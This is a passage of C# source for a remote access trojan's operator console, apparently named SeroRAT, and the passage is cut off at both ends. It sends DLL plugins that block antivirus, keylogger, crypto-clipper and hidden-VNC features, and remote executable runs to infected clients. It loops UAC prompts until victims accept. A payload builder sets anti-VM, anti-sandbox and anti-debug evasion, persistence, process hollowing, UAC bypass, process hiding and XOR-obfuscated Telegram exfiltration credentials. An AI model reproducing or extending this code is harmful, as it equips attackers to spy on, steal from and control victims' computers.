                { DllBase64 = Convert.ToBase64String(bytes), ExportName = "PluginMain" })
            };
            foreach (var c in clients) await _server.SendToClient(c.Id, pkt);
            Dispatcher.BeginInvoke(() => Log($"[+] Block AV DNS sent to {clients.Count} client(s)."));
        });
    }

    private void QuickBlockReset_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        _ = Task.Run(async () =>
        {
            var cachePath = PluginCachePath("Block Reset");
            if (!System.IO.File.Exists(cachePath))
            {
                AutoTask_BlockReset_Click(sender, e);
                return;
            }
            var bytes = await System.IO.File.ReadAllBytesAsync(cachePath);
            var pkt = new Protocol.Packet
            {
                Type = Protocol.PacketType.PluginExec,
                Data = Newtonsoft.Json.JsonConvert.SerializeObject(new Protocol.PluginExecData
                { DllBase64 = Convert.ToBase64String(bytes), ExportName = "PluginMain" })
            };
            foreach (var c in clients) await _server.SendToClient(c.Id, pkt);
            Dispatcher.BeginInvoke(() => Log($"[+] Block WSReset sent to {clients.Count} client(s)."));
        });
    }
    #pragma warning restore CS4014

    private TikTokWindow? _tikTokWindow;
    private void TikTok_Click(object sender, RoutedEventArgs e)
    {
        if (_server == null) return;
        if (_tikTokWindow == null || !_tikTokWindow.IsLoaded)
        {
            var selectedIds = GridClients.SelectedItems.Cast<ConnectedClient>().Select(c => c.Id);
            _tikTokWindow = new TikTokWindow(_server, selectedIds) { Owner = this };
            _tikTokWindow.Show();
        }
        else
            _tikTokWindow.Activate();
    }

    private async void Keylogger_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<KeyloggerWindow>(c.Id, () => new KeyloggerWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
        Log($"[*] Keylogger opened for {clients.Count} client(s).");
    }

    private async void CryptoClipper_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<CryptoClipperWindow>(c.Id, () => new CryptoClipperWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
        Log($"[*] Crypto Clipper opened for {clients.Count} client(s).");
    }

    private HvncBroadcastWindow? _broadcastWindow;
    private void HvncBroadcast_Click(object sender, RoutedEventArgs e)
    {
        if (_server == null) return;
        if (_broadcastWindow == null || !_broadcastWindow.IsLoaded)
        {
            _broadcastWindow = new HvncBroadcastWindow(_server) { Owner = this };
            _broadcastWindow.Show();
        }
        else
            _broadcastWindow.Activate();
    }

    private async void Hvnc_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        var server = _server;
        var area = SystemParameters.WorkArea;
        const int step = 28, margin = 60, winW = 900, winH = 580;
        int maxSteps = Math.Max(1, (int)(Math.Min(area.Width - winW - margin, area.Height - winH - margin) / step));
        int i = 0;
        foreach (var c in clients)
        {
            int s = (i % maxSteps) * step;
            OpenFeatureWindow<HvncWindow>(c.Id, () =>
            {
                var w = new HvncWindow(server, c.Id);
                w.Left = area.Left + margin + s;
                w.Top  = area.Top  + margin + s;
                return w;
            });
            i++;
            if (clients.Count > 1) await Task.Delay(80);
        }
        Log($"[*] HVNC opened for {clients.Count} client(s).");
    }


    private async void RemoteFileExec_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;

        var dialog = new Microsoft.Win32.OpenFileDialog
        {
            Filter = "Executable (*.exe)|*.exe|All Files (*.*)|*.*",
            Title = "Select file to execute on client(s)"
        };

        if (dialog.ShowDialog() != true) return;

        try
        {
            var fileBytes = await File.ReadAllBytesAsync(dialog.FileName);
            var fileName = Path.GetFileName(dialog.FileName);

            var data = new RemoteFileExecData
            {
                FileName = fileName,
                FileBase64 = Convert.ToBase64String(fileBytes)
            };

            var packet = new Packet
            {
                Type = PacketType.RemoteFileExec,
                Data = Newtonsoft.Json.JsonConvert.SerializeObject(data)
            };

            foreach (var client in clients)
            {
                await _server.SendToClient(client.Id, packet);
            }

            Log($"[+] Sent {fileName} ({fileBytes.Length:N0} bytes) to {clients.Count} client(s).");
            TxtStatusBar.Text = $"File sent to {clients.Count} client(s).";
        }
        catch (Exception ex)
        {
            Log($"[!] Remote file exec failed: {ex.Message}");
        }
    }

    private async void UpdateClient_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;

        var dialog = new Microsoft.Win32.OpenFileDialog
        {
            Filter = "Executable (*.exe)|*.exe|All Files (*.*)|*.*",
            Title = "Select client binary to update client(s)"
        };

        if (dialog.ShowDialog() != true) return;

        try
        {
            var fileBytes = await File.ReadAllBytesAsync(dialog.FileName);
            var fileName = Path.GetFileName(dialog.FileName);

            var data = new UpdateClientData
            {
                FileName = fileName,
                FileBase64 = Convert.ToBase64String(fileBytes)
            };

            var packet = new Packet
            {
                Type = PacketType.UpdateClient,
                Data = Newtonsoft.Json.JsonConvert.SerializeObject(data)
            };

            foreach (var client in clients)
            {
                await _server.SendToClient(client.Id, packet);
            }

            Log($"[+] Sent update {fileName} ({fileBytes.Length:N0} bytes) to {clients.Count} client(s). ");
            TxtStatusBar.Text = $"Update file sent to {clients.Count} client(s).";
        }
        catch (Exception ex)
        {
            Log($"[!] Update client failed: {ex.Message}");
        }
    }

    private async void UninstallClient_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;

        var result = MessageBox.Show(
            $"Uninstall client from {clients.Count} machine(s)?\nThis will remove persistence and delete the client.",
            "Confirm Uninstall",
            MessageBoxButton.YesNo,
            MessageBoxImage.Warning);

        if (result != MessageBoxResult.Yes) return;

        var packet = new Packet { Type = PacketType.Uninstall };

        foreach (var client in clients)
        {
            client.PendingUninstall = true;
            await _server.SendToClient(client.Id, packet);
            Log($"[*] Uninstall sent to {client.Username}@{client.IP} ({client.Id}).");
        }

        TxtStatusBar.Text = $"Uninstall sent to {clients.Count} client(s).";
    }

    // ── UAC Elevation ───────────────────────────────

    private async void RequestElevation_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;

        var packet = new Packet { Type = PacketType.RequestElevation };
        foreach (var client in clients)
        {
            await _server.SendToClient(client.Id, packet);
            Log($"[UAC] Elevation request sent to {client.Username}@{client.IP}.");
        }

        TxtStatusBar.Text = $"UAC elevation sent to {clients.Count} client(s).";
    }

    private async void RequestElevationLoop_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;

        var result = MessageBox.Show(
            $"Loop UAC popup on {clients.Count} machine(s) until user accepts?",
            "Confirm UAC Loop",
            MessageBoxButton.YesNo,
            MessageBoxImage.Question);

        if (result != MessageBoxResult.Yes) return;

        var packet = new Packet { Type = PacketType.RequestElevationLoop };
        foreach (var client in clients)
        {
            await _server.SendToClient(client.Id, packet);
            Log($"[UAC] Elevation loop started on {client.Username}@{client.IP}.");
        }

        TxtStatusBar.Text = $"UAC loop started on {clients.Count} client(s).";
    }

    // ── Tags ────────────────────────────────────────

    private void SetTag_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0) return;

        var currentTag = clients.Count == 1 ? clients[0].Tag : "";
        var dlg = new TagDialog(currentTag) { Owner = this };
        if (dlg.ShowDialog() != true) return;

        foreach (var client in clients)
        {
            client.Tag = dlg.TagValue;
            _store.SetTag(client.Hwid, dlg.TagValue);
        }

        RefreshClients();
        RefreshAllClients();
        TxtStatusBar.Text = $"Tag set on {clients.Count} client(s).";
    }

    private void SetTagRecord_Click(object sender, RoutedEventArgs e)
    {
        var records = GridAllClients.SelectedItems.Cast<ClientRecord>().ToList();
        if (records.Count == 0) return;

        var currentTag = records.Count == 1 ? records[0].Tag : "";
        var dlg = new TagDialog(currentTag) { Owner = this };
        if (dlg.ShowDialog() != true) return;

        foreach (var record in records)
        {
            _store.SetTag(record.Hwid, dlg.TagValue);
        }

        // Also update any connected clients with matching HWID
        if (_server != null)
        {
            foreach (var record in records)
            {
                foreach (var client in _server.ConnectedClients.Values)
                {
                    if (client.Hwid == record.Hwid)
                        client.Tag = dlg.TagValue;
                }
            }
        }

        RefreshClients();
        RefreshAllClients();
        TxtStatusBar.Text = $"Tag set on {records.Count} record(s).";
    }

    // ── Client Logs ─────────────────────────────────

    private void ViewClientLogs_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0) return;

        foreach (var client in clients)
        {
            if (_store.AllClients.TryGetValue(client.Hwid, out var record))
            {
                var logWin = new ClientLogWindow(record) { Owner = this };
                logWin.Show();
            }
        }
    }

    private void ViewRecordLogs_Click(object sender, RoutedEventArgs e)
    {
        var records = GridAllClients.SelectedItems.Cast<ClientRecord>().ToList();
        foreach (var record in records)
        {
            var logWin = new ClientLogWindow(record) { Owner = this };
            logWin.Show();
        }
    }

    // ── Copy ────────────────────────────────────────

    private void CopyHwid_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0) return;

        var hwids = string.Join("\n", clients.Select(c => c.Hwid));
        Clipboard.SetText(hwids);
        TxtStatusBar.Text = clients.Count == 1 ? $"Copied HWID: {hwids}" : $"Copied {clients.Count} HWIDs";
    }

    private void CopyIP_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0) return;

        var ips = string.Join("\n", clients.Select(c => c.IP));
        Clipboard.SetText(ips);
        TxtStatusBar.Text = clients.Count == 1 ? $"Copied IP: {ips}" : $"Copied {clients.Count} IPs";
    }

    // ── Client search ─────────────────────────────────────────────────────────

    private void TxtSearch_TextChanged(object sender, System.Windows.Controls.TextChangedEventArgs e)
    {
        var view = System.Windows.Data.CollectionViewSource.GetDefaultView(_onlineClients);
        view?.Refresh();
    }

    private void TxtSearch_KeyDown(object sender, System.Windows.Input.KeyEventArgs e)
    {
        if (e.Key != System.Windows.Input.Key.Enter) return;

        // Select all clients currently visible after the filter
        GridClients.SelectAll();

        // If exactly one result, focus the grid so context menu / actions work immediately
        if (GridClients.Items.Count == 1)
            GridClients.Focus();

        e.Handled = true;
    }

    private bool ClientFilter(object obj)
    {
        if (obj is not ConnectedClient c) return false;
        var q = TxtSearch?.Text?.Trim() ?? "";
        if (string.IsNullOrEmpty(q)) return true;

        // Case-insensitive search across all visible fields
        return c.IP.Contains(q, StringComparison.OrdinalIgnoreCase)
            || c.Id.Contains(q, StringComparison.OrdinalIgnoreCase)
            || c.Tag.Contains(q, StringComparison.OrdinalIgnoreCase)
            || c.Username.Contains(q, StringComparison.OrdinalIgnoreCase)
            || c.MachineName.Contains(q, StringComparison.OrdinalIgnoreCase)
            || c.CountryDisplay.Contains(q, StringComparison.OrdinalIgnoreCase)
            || c.OS.Contains(q, StringComparison.OrdinalIgnoreCase)
            || c.ActiveWindow.Contains(q, StringComparison.OrdinalIgnoreCase)
            || c.Payload.Contains(q, StringComparison.OrdinalIgnoreCase)
            || c.Antivirus.Contains(q, StringComparison.OrdinalIgnoreCase);
    }

    private void CopyRecordHwid_Click(object sender, RoutedEventArgs e)
    {
        var records = GridAllClients.SelectedItems.Cast<ClientRecord>().ToList();
        if (records.Count == 0) return;

        var hwids = string.Join("\n", records.Select(r => r.Hwid));
        Clipboard.SetText(hwids);
        TxtStatusBar.Text = records.Count == 1 ? $"Copied HWID: {hwids}" : $"Copied {records.Count} HWIDs";
    }

    // ── Builder ─────────────────────────────────────

    private void BldGenMutex_Click(object sender, RoutedEventArgs e)
    {
        BldMutex.Text = $"Global\\{{{Guid.NewGuid()}}}";
    }

    private void BldPersist_Changed(object sender, RoutedEventArgs e)
    {
        if (BldInstallPanel == null) return;

        bool anyPersist = BldPersistRegistry.IsChecked == true
                       || BldPersistStartup.IsChecked == true
                       || BldPersistTask.IsChecked == true;

        BldInstallPanel.Visibility = anyPersist ? Visibility.Visible : Visibility.Collapsed;

        bool maxPersist = BldAntiKill.IsChecked == true
                       && BldPersistRegistry.IsChecked == true
                       && BldPersistStartup.IsChecked == true
                       && BldPersistTask.IsChecked == true;

        if (TxtMaxPersist != null)
            TxtMaxPersist.Visibility = maxPersist ? Visibility.Visible : Visibility.Collapsed;
    }

    private async void BtnTelegramTest_Click(object sender, RoutedEventArgs e)
    {
        var token   = BldTelegramToken.Text.Trim();
        var chatId1 = BldTelegramChatId1.Text.Trim();
        var chatId2 = BldTelegramChatId2.Text.Trim();

        if (string.IsNullOrEmpty(token) || string.IsNullOrEmpty(chatId1))
        {
            TxtTelegramTestResult.Text       = "✗ Fill token + Chat ID 1";
            TxtTelegramTestResult.Foreground = new System.Windows.Media.SolidColorBrush(
                System.Windows.Media.Color.FromRgb(0xEF, 0x44, 0x44));
            return;
        }

        BtnTelegramTest.IsEnabled            = false;
        TxtTelegramTestResult.Text           = "Sending…";
        TxtTelegramTestResult.Foreground     = new System.Windows.Media.SolidColorBrush(
            System.Windows.Media.Color.FromRgb(0x70, 0x90, 0xC0));

        var targets = new List<string> { chatId1 };
        if (!string.IsNullOrEmpty(chatId2)) targets.Add(chatId2);

        string msg = "SeroRAT - test notification\nBot is configured correctly.";
        bool allOk = true;
        string? lastErr = null;

        try
        {
            using var http = new System.Net.Http.HttpClient { Timeout = TimeSpan.FromSeconds(8) };
            foreach (var id in targets)
            {
                var url  = $"https://api.telegram.org/bot{token}/sendMessage" +
                           $"?chat_id={Uri.EscapeDataString(id)}" +
                           $"&text={Uri.EscapeDataString(msg)}";
                var resp = await http.GetAsync(url);
                if (!resp.IsSuccessStatusCode)
                {
                    allOk = false;
                    var respBody = await resp.Content.ReadAsStringAsync();
                    var desc = "";
                    try
                    {
                        var j = System.Text.Json.JsonDocument.Parse(respBody);
                        if (j.RootElement.TryGetProperty("description", out var d))
                            desc = d.GetString() ?? "";
                    }
                    catch { }
                    lastErr = string.IsNullOrEmpty(desc)
                        ? $"HTTP {(int)resp.StatusCode} — chat_id: {id}"
                        : $"{desc} (chat_id: {id})";
                }
            }
        }
        catch (Exception ex)
        {
            allOk   = false;
            lastErr = ex.GetType().Name;
        }

        BtnTelegramTest.IsEnabled = true;
        if (allOk)
        {
            TxtTelegramTestResult.Text       = "✓ Success";
            TxtTelegramTestResult.Foreground = new System.Windows.Media.SolidColorBrush(
                System.Windows.Media.Color.FromRgb(0x22, 0xC5, 0x5E));
        }
        else
        {
            TxtTelegramTestResult.Text       = $"✗ Error: {lastErr}";
            TxtTelegramTestResult.Foreground = new System.Windows.Media.SolidColorBrush(
                System.Windows.Media.Color.FromRgb(0xEF, 0x44, 0x44));
        }
    }

    private void BldSaveConfig_Click(object sender, RoutedEventArgs e)
    {
        var result = MessageBox.Show(
            "Save builder configuration?",
            "Sero — Confirm",
            MessageBoxButton.YesNo,
            MessageBoxImage.Question);

        if (result == MessageBoxResult.Yes)
        {
            SaveConfig();
            TxtStatusBar.Text = "Configuration saved.";
        }
    }

    private void BldCheckAll_Click(object sender, RoutedEventArgs e)
    {
        BldAntiDebug.IsChecked = true;
        BldAntiVM.IsChecked = true;
        BldAntiDetect.IsChecked = true;
        BldAntiSandbox.IsChecked = true;
        BldAntiKill.IsChecked = true;
        BldAntiKill.IsChecked = true;
        BldPersistRegistry.IsChecked = true;
        BldPersistStartup.IsChecked = true;
        BldPersistTask.IsChecked = true;
        BldHollowing.IsChecked = true;
    }

    private void LoadConfig()
    {
        try
        {
            if (!File.Exists(ConfigFilePath)) return;
            var json = File.ReadAllText(ConfigFilePath);
            var cfg = Newtonsoft.Json.JsonConvert.DeserializeObject<Dictionary<string, string>>(json);
            if (cfg == null) return;

            // Auth key (locked once set)
            if (cfg.TryGetValue("AuthKey", out var key) && !string.IsNullOrEmpty(key))
            { BldAuthKey.Text = key; BldAuthKey.IsReadOnly = true; }

            // Connection (supports multiple hosts)
            if (cfg.TryGetValue("Hosts", out var hostsJson))
            {
                BldHosts.Items.Clear();
                var hosts = Newtonsoft.Json.JsonConvert.DeserializeObject<List<string>>(hostsJson);
                if (hosts != null)
                {
                    foreach (var h in hosts)
                        BldHosts.Items.Add(h);
                }
            }
            else if (cfg.TryGetValue("Host", out var host))
            {
                // Backward compatibility with old single-host config
                BldHosts.Items.Clear();
                BldHosts.Items.Add(host);
            }
            if (cfg.TryGetValue("Port", out var port)) { BldPort.Text = port; TxtPort.Text = port; }
            if (cfg.TryGetValue("UsePastebin", out var pastebin)) BldUsePastebin.IsChecked = pastebin == "1";
            if (cfg.TryGetValue("PastebinUrl", out var pastebinUrl)) BldPastebinUrl.Text = pastebinUrl;

            // Identity
            if (cfg.TryGetValue("ClientIdPrefix", out var cp)) BldClientIdPrefix.Text = cp;

            // Checkboxes
            if (cfg.TryGetValue("AntiDebug", out var v)) BldAntiDebug.IsChecked = v == "1";
            if (cfg.TryGetValue("AntiVM", out v)) BldAntiVM.IsChecked = v == "1";
            if (cfg.TryGetValue("AntiDetect", out v)) BldAntiDetect.IsChecked = v == "1";
            if (cfg.TryGetValue("AntiSandbox", out v)) BldAntiSandbox.IsChecked = v == "1";
            if (cfg.TryGetValue("AntiKill", out v)) BldAntiKill.IsChecked = v == "1";
            if (cfg.TryGetValue("PersistRegistry", out v)) BldPersistRegistry.IsChecked = v == "1";
            if (cfg.TryGetValue("PersistStartup", out v)) BldPersistStartup.IsChecked = v == "1";
            if (cfg.TryGetValue("PersistTask", out v)) BldPersistTask.IsChecked = v == "1";
            if (cfg.TryGetValue("Hollowing", out v)) BldHollowing.IsChecked = v == "1";
            if (cfg.TryGetValue("HollowTarget", out var ht)) BldHollowTarget.Text = ht;
            if (cfg.TryGetValue("Encrypt", out v)) BldEncrypt.IsChecked = v == "1";
            if (cfg.TryGetValue("UacBypass", out v)) BldUacBypass.IsChecked = v == "1";

            // Reconnect
            if (cfg.TryGetValue("ReconnectDelay", out var rd)) BldReconnectDelay.Text = rd;

            // Install folder & file name
            if (cfg.TryGetValue("InstallFolder", out var installFolder)) BldInstallFolder.Text = installFolder;
            if (cfg.TryGetValue("InstallFileName", out var installFileName)) BldInstallFileName.Text = installFileName;

            // Settings tab
            if (cfg.TryGetValue("MaxClients", out var mc) && !string.IsNullOrEmpty(mc)) SettingsMaxClients.Text = mc;
            if (cfg.TryGetValue("DiscordRPC", out v)) SettingsDiscordRPC.IsChecked = v == "1";

            // Telegram notifications
            if (cfg.TryGetValue("TelegramEnabled", out v)) BldTelegramEnabled.IsChecked = v == "1";
            if (cfg.TryGetValue("TelegramToken", out var tt)) BldTelegramToken.Text = tt;
            if (cfg.TryGetValue("TelegramChatId1", out var tc1)) BldTelegramChatId1.Text = tc1;
            if (cfg.TryGetValue("TelegramChatId2", out var tc2)) BldTelegramChatId2.Text = tc2;
            if (cfg.TryGetValue("MnrStatsToken", out var mst) && !string.IsNullOrEmpty(mst)) BldMnrStatsToken.Text = mst;

            // Crypto Clipper
            if (cfg.TryGetValue("ClipperBTC",  out var cBtc))  ClipperBTC.Text  = cBtc;
            if (cfg.TryGetValue("ClipperETH",  out var cEth))  ClipperETH.Text  = cEth;
            if (cfg.TryGetValue("ClipperLTC",  out var cLtc))  ClipperLTC.Text  = cLtc;
            if (cfg.TryGetValue("ClipperTRX",  out var cTrx))  ClipperTRX.Text  = cTrx;
            if (cfg.TryGetValue("ClipperSOL",  out var cSol))  ClipperSOL.Text  = cSol;
            if (cfg.TryGetValue("ClipperXMR",  out var cXmr))  ClipperXMR.Text  = cXmr;
            if (cfg.TryGetValue("ClipperXRP",  out var cXrp))  ClipperXRP.Text  = cXrp;
            if (cfg.TryGetValue("ClipperDASH", out var cDash)) ClipperDASH.Text = cDash;
            if (cfg.TryGetValue("ClipperBCH",  out var cBch))  ClipperBCH.Text  = cBch;

            Log("[+] Builder config loaded.");
        }
        catch { }
    }

    private void SaveConfig()
    {
        try
        {
            var path = ConfigFilePath;
            var cfg = new Dictionary<string, string>
            {
                ["AuthKey"] = BldAuthKey.Text.Trim(),
                ["Hosts"] = Newtonsoft.Json.JsonConvert.SerializeObject(BldHosts.Items.Cast<string>().ToList()),
                ["Host"] = GetPrimaryHost(), // backward compatibility
                ["Port"] = TxtPort.Text.Trim(),
                ["ClientIdPrefix"] = BldClientIdPrefix.Text.Trim(),
                ["UsePastebin"] = BldUsePastebin.IsChecked == true ? "1" : "0",
                ["PastebinUrl"] = BldPastebinUrl.Text.Trim(),
                ["AntiDebug"] = BldAntiDebug.IsChecked == true ? "1" : "0",
                ["AntiVM"] = BldAntiVM.IsChecked == true ? "1" : "0",
                ["AntiDetect"] = BldAntiDetect.IsChecked == true ? "1" : "0",
                ["AntiSandbox"] = BldAntiSandbox.IsChecked == true ? "1" : "0",
                ["AntiKill"] = BldAntiKill.IsChecked == true ? "1" : "0",
                ["PersistRegistry"] = BldPersistRegistry.IsChecked == true ? "1" : "0",
                ["PersistStartup"] = BldPersistStartup.IsChecked == true ? "1" : "0",
                ["PersistTask"] = BldPersistTask.IsChecked == true ? "1" : "0",
                ["Hollowing"] = BldHollowing.IsChecked == true ? "1" : "0",
                ["HollowTarget"] = GetHollowTarget(),
                ["Encrypt"] = BldEncrypt.IsChecked == true ? "1" : "0",
                ["UacBypass"] = BldUacBypass.IsChecked == true ? "1" : "0",
                ["ReconnectDelay"] = BldReconnectDelay.Text.Trim(),
                ["InstallFolder"] = BldInstallFolder.Text.Trim(),
                ["InstallFileName"] = BldInstallFileName.Text.Trim(),
                ["MaxClients"] = SettingsMaxClients.Text.Trim(),
                ["DiscordRPC"] = SettingsDiscordRPC.IsChecked == true ? "1" : "0",
                ["TelegramEnabled"] = BldTelegramEnabled.IsChecked == true ? "1" : "0",
                ["TelegramToken"] = BldTelegramToken.Text.Trim(),
                ["TelegramChatId1"] = BldTelegramChatId1.Text.Trim(),
                ["TelegramChatId2"] = BldTelegramChatId2.Text.Trim(),
                ["MnrStatsToken"] = BldMnrStatsToken.Text.Trim(),
                ["ClipperBTC"]  = ClipperBTC.Text.Trim(),
                ["ClipperETH"]  = ClipperETH.Text.Trim(),
                ["ClipperLTC"]  = ClipperLTC.Text.Trim(),
                ["ClipperTRX"]  = ClipperTRX.Text.Trim(),
                ["ClipperSOL"]  = ClipperSOL.Text.Trim(),
                ["ClipperXMR"]  = ClipperXMR.Text.Trim(),
                ["ClipperXRP"]  = ClipperXRP.Text.Trim(),
                ["ClipperDASH"] = ClipperDASH.Text.Trim(),
                ["ClipperBCH"]  = ClipperBCH.Text.Trim(),
            };
            File.WriteAllText(path, Newtonsoft.Json.JsonConvert.SerializeObject(cfg, Newtonsoft.Json.Formatting.Indented));
            Log($"[+] Config saved to {path}");

        }
        catch (Exception ex) { Log($"[!] Failed to save config: {ex.Message}"); }
    }

    private string GetStubProjectDir()
    {
        // Strategy 1: relative to BaseDirectory (bin/Debug/net10.0-windows -> sero/)
        var serverDir = AppDomain.CurrentDomain.BaseDirectory;
        var seroRoot = Path.GetFullPath(Path.Combine(serverDir, "..", "..", "..", ".."));
        var stubDir = Path.Combine(seroRoot, "stub");
        if (Directory.Exists(stubDir) && File.Exists(Path.Combine(stubDir, "SeroStub.csproj")))
            return stubDir;

        // Strategy 2: walk up from BaseDirectory looking for stub/SeroStub.csproj
        var dir = new DirectoryInfo(serverDir);
        while (dir != null)
        {
            var candidate = Path.Combine(dir.FullName, "stub");
            if (File.Exists(Path.Combine(candidate, "SeroStub.csproj")))
                return candidate;
            dir = dir.Parent;
        }

        // Fallback
        return stubDir;
    }

    /// <summary>
    /// Finds the pre-compiled hook DLL (x64 Release) relative to the server binary.
    /// Returns null if not found.
    /// </summary>
    private string? FindHookDll()
    {
        var serverDir = AppDomain.CurrentDomain.BaseDirectory;
        // Repo layout varies: server/bin/Debug/net10.0-windows/ (4 up) or server/bin/x64/Release/net10.0-windows/ (5 up)
        var candidates = new[]
        {
            Path.GetFullPath(Path.Combine(serverDir, "..", "..", "..", "..", "..", "hook", "hook", "x64", "Release", "hook.dll")),
            Path.GetFullPath(Path.Combine(serverDir, "..", "..", "..", "..", "hook", "hook", "x64", "Release", "hook.dll")),
            Path.GetFullPath(Path.Combine(serverDir, "..", "..", "..", "..", "..", "hook", "x64", "Release", "hook.dll")),
            Path.GetFullPath(Path.Combine(serverDir, "..", "..", "..", "..", "hook", "x64", "Release", "hook.dll")),
            Path.Combine(serverDir, "hook.dll"),
            Path.GetFullPath(Path.Combine(serverDir, "..", "hook.dll")),
        };
        foreach (var c in candidates)
            if (File.Exists(c)) return c;
        return null;
    }

    private string? FindHookDll32()
    {
        var serverDir = AppDomain.CurrentDomain.BaseDirectory;
        var c32 = new[]
        {
            Path.GetFullPath(Path.Combine(serverDir, "..", "..", "..", "..", "..", "hook", "hook", "Release", "hook.dll")),
            Path.GetFullPath(Path.Combine(serverDir, "..", "..", "..", "..", "hook", "hook", "Release", "hook.dll")),
            Path.GetFullPath(Path.Combine(serverDir, "..", "..", "..", "..", "..", "hook", "hook", "Win32", "Release", "hook.dll")),
            Path.GetFullPath(Path.Combine(serverDir, "..", "..", "..", "..", "hook", "hook", "Win32", "Release", "hook.dll")),
            Path.Combine(serverDir, "hook32.dll"),
        };
        foreach (var c in c32) if (File.Exists(c)) return c;
        return null;
    }

    private string GenerateConfigCs()
    {
        int.TryParse(BldPort.Text, out int port);
        int.TryParse(BldReconnectDelay.Text, out int reconnect);
        if (port < 1 || port > 65535) port = 7777;
        if (reconnect < 1000) reconnect = 5000;

        var installFolder = BldInstallFolder.Text.Trim();
        if (string.IsNullOrEmpty(installFolder)) installFolder = "Windows";
        var installFileName = BldInstallFileName.Text.Trim();
        if (string.IsNullOrEmpty(installFileName)) installFileName = "windows.exe";
        // Ensure .exe extension
        if (!installFileName.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
            installFileName += ".exe";
        var fileNameNoExt = Path.GetFileNameWithoutExtension(installFileName);

        var useMutex = BldUseMutex.IsChecked == true ? "true" : "false";
        // Generate a unique mutex name per build so old test instances never block new builds
        var mutexName = BldUseMutex.IsChecked == true ? $"Global\\\\{Guid.NewGuid():N}" : "";

        // Escape for C# string literal — prevents quote injection in generated Config.cs
        static string Esc(string s) => s.Replace("\\", "\\\\").Replace("\"", "\\\"");

        const string hookDllLine   = "    public static readonly byte[] HookDllBytes   = Array.Empty<byte>();";
        const string hookDll32Line = "    public static readonly byte[] HookDllBytes32 = Array.Empty<byte>();";

        // Per-build random XOR key for Telegram credentials
        var telegramXorKeyBytes = System.Security.Cryptography.RandomNumberGenerator.GetBytes(32);
        var telegramXorKey = telegramXorKeyBytes;
        static string ByteArrayLiteral(byte[] b) =>
            "new byte[] { " + string.Join(", ", b.Select(x => x.ToString())) + " }";
        static byte[] XorEncode(string s, byte[] key)
        {
            if (string.IsNullOrEmpty(s)) return Array.Empty<byte>();
            var src = System.Text.Encoding.UTF8.GetBytes(s);
            var out2 = new byte[src.Length];
            for (int i = 0; i < src.Length; i++) out2[i] = (byte)(src[i] ^ key[i % key.Length]);
            return out2;
        }
        string BuildXorBytes(string s, byte[] key) => ByteArrayLiteral(XorEncode(s, key));
        string telegramXorKeyLiteral = ByteArrayLiteral(telegramXorKeyBytes);

        return $@"namespace SeroStub;

internal static class Config
{{
    public static readonly string[] Hosts = new[] {{ {string.Join(", ", BldHosts.Items.Cast<string>().Select(h => $"\"{Esc(h)}\""))} }};
    public const int Port = {port};
    public const bool UseMutex = {useMutex};
    public const string MutexName = ""{mutexName}"";

    public const bool AntiDebug = {(BldAntiDebug.IsChecked == true ? "true" : "false")};
    public const bool AntiVM = {(BldAntiVM.IsChecked == true ? "true" : "false")};
    public const bool AntiDetect = {(BldAntiDetect.IsChecked == true ? "true" : "false")};
    public const bool AntiSandbox = {(BldAntiSandbox.IsChecked == true ? "true" : "false")};

    public const bool PersistRegistry = {(BldPersistRegistry.IsChecked == true ? "true" : "false")};
    public const bool PersistStartup = {(BldPersistStartup.IsChecked == true ? "true" : "false")};
    public const bool PersistTask = {(BldPersistTask.IsChecked == true ? "true" : "false")};
    public const string PersistName = ""{Esc(fileNameNoExt.ToLowerInvariant())}"";

    public const bool AntiKill = {(BldAntiKill.IsChecked == true ? "true" : "false")};
    public const bool EnableWatchdog = {(BldAntiKill.IsChecked == true ? "true" : "false")};
    public const bool EnableHollowing = {(BldHollowing.IsChecked == true ? "true" : "false")};
    public const string HollowTarget = ""{Esc(GetHollowTarget())}"";

    public const string AuthKey = ""{Esc(BldAuthKey.Text.Trim())}"";
    public const string CertHash = ""{Esc(BldCertHash.Text.Trim())}"";

    // Unique per build — changes the compiled binary hash even with identical settings
    public const string BuildId = ""{Guid.NewGuid():N}"";

    public const int ReconnectDelayMs = {reconnect};
    public const int HeartbeatIntervalMs = 3000;

    public const string ClientIdPrefix = ""{Esc(BldClientIdPrefix.Text.Trim())}"";

    // HiddenProcessName = install filename without extension = DLL prefix
    // The hook DLL reads its own filename as the prefix and hides everything starting with it.
    public const string HiddenProcessName = ""{Esc(fileNameNoExt.ToLowerInvariant())}"";
    public const string HiddenFileName = ""{Esc(installFileName.ToLowerInvariant())}"";

    public const bool EnableRootkit = false;
{hookDllLine}
{hookDll32Line}

    // Telegram notification (XOR-encoded — never stored as plaintext in binary)
    public const bool TelegramEnabled = {(BldTelegramEnabled.IsChecked == true ? "true" : "false")};
    public static readonly byte[] TelegramTokenXor   = {BuildXorBytes(BldTelegramToken.Text.Trim(), telegramXorKey)};
    public static readonly byte[] TelegramChatId1Xor = {BuildXorBytes(BldTelegramChatId1.Text.Trim(), telegramXorKey)};
